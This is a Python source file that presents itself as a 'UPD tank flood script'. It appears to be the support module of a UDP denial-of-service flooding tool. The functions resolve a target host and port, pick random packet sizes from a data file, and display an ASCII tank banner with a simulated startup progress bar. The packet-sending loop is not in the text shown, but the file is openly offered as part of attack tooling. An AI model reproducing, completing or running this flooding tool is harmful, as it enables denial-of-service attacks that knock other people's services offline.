import random
import socket
import time
from os import system
from sys import stdout
from colorama import init
from colorama import Fore, Back, Style


class Memorize:
    def __init__(self, fn):
        self.fn = fn
        self.memo = {}

    def __call__(self, *args):
        if args not in self.memo:
            self.memo[args] = self.fn(*args)
        return self.memo[args]


@Memorize
def read_file(path):
    FILE_SIZE = 100_000
    file = open(path, "r")
    skipSize = random.choice(range(0, FILE_SIZE))
    file.read(skipSize)
    return file


def get_domain(domain: str):
    return socket.gethostbyname(domain)


def get_ip(ip, domain, port):
    if domain:
        return get_domain(domain), port
    if ip:
        return ip, port


def get_rand_pack():
    text = read_file("pack.txt")
    size = random.choice(range(3, 6))
    return int(text.read(size))


def print_tank():
    init()
    system('clear')
    tank =  \
      Fore.RED + "        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ \n\
        ░░████████████████████████████░░ \n\
        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ \n\
        ██████░░██░░░░██░░░░██░░██░░░░██ \n\
        ░░██░░██░░██░░████░░██░░██░░██░░ \n\
        ░░██░░██████░░██░░████░░████░░░░ \n\
        ░░██░░██░░██░░██░░░░██░░██░░██░░ \n\
        ░░██░░██░░██░░██░░░░██░░██░░░░██ \n\
        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ \n\
        ░░████████████████████████████░░ \n\
        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ \n"
    stdout.write(tank)
    stdout.write(Fore.GREEN + 'Hello im UPD tank flood script\n')
    time.sleep(1.5)
    progress = 0
    while progress != 100:
        progress += random.randint(17, 25)
        time.sleep(0.5)
        if progress >= 100:
            system('clear')
            stdout.write(tank)
            stdout.write(f"start progress: 100\n")
            break
        system('clear')
        stdout.write(tank)
        stdout.write(f"start progress: {progress}\n")
